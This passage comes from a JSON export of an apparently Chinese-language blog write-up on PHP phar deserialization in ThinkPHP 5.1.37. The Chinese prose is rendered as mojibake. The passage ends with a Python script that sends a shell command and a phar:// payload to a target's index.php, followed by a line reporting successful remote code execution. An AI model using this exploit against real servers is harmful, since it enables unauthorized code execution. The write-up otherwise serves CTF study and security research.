print(s)</span></span><br><span class=\"line\">remote = <span class=\"string\">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class=\"line\">sess =requests.session()</span><br><span class=\"line\">r = sess.post(</span><br><span class=\"line\">    url = <span class=\"string\">f&#x27;http://<span class=\"subst\">&#123;remote&#125;</span>/index.php/index/index/hello&#x27;</span>,</span><br><span class=\"line\">    params=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ethan&#x27;</span>:<span class=\"string\">&#x27;&lt;here_is_your_shell_command&gt;&#x27;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;world&#x27;</span>:<span class=\"string\">f&#x27;hello=<span class=\"subst\">&#123;s&#125;</span>&amp;a=phar://./hello.txt&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n\n<p>æˆåŠŸRCE</p>\n<hr>\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>pharååºåˆ—åŒ–æä¾›äº†ä¸€ç§æ‰©å±•ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢çš„æ–¹å¼ã€å…¥å£ï¼Œæ‰€ä»¥åŸºäºunserialize()å‡½æ•°çš„å„ç±»æ”»å‡»tricksï¼ˆæ¯”å¦‚å¼•ç”¨ç»•è¿‡ä¹‹ç±»çš„ï¼‰ä¾ç„¶é€‚ç”¨ã€‚é‰´äºpharååºåˆ—åŒ–æ¼æ´è®¾è®¡ç‰ˆæœ¬è¾ƒå¤šï¼Œç›¸ä¿¡CTFæ¯”èµ›ä¸­å®ƒä»ç„¶ä¼šç¨³å®šå‡ºåœºã€‚</p>\n<hr>\n<p>å‚è€ƒèµ„æ–™ï¼š</p>\n<p><a href=\"https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html\">Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´</a></p>\n<p><a href=\"https://www.php.net/manual/zh/class.phar.php\">https://www.php.net/manual/zh/class.phar.php</a></p>\n<p><a href=\"https://blog.csdn.net/lllffg/article/details/116145918\">Thinkphp 5.1.37ååºåˆ—åŒ–æ¼æ´</a></p>\n<p><a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf\">us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It</a></p>\n<p><a href=\"https://github.dev/php/php-src\">https://github.dev/php/php-src</a></p>\n<p><a href=\"https://www.webhek.com/post/packaging-your-php-apps-with-phar.html\">packaging-your-php-apps-with-phar</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/205943.html\">PHARååºåˆ—åŒ–æ‹“å±•æ“ä½œæ€»ç»“</a></p>\n",
            "tags": [
                "Phar",
                "ååºåˆ—åŒ–",
                "PHP"
            ]
        }
    ]
}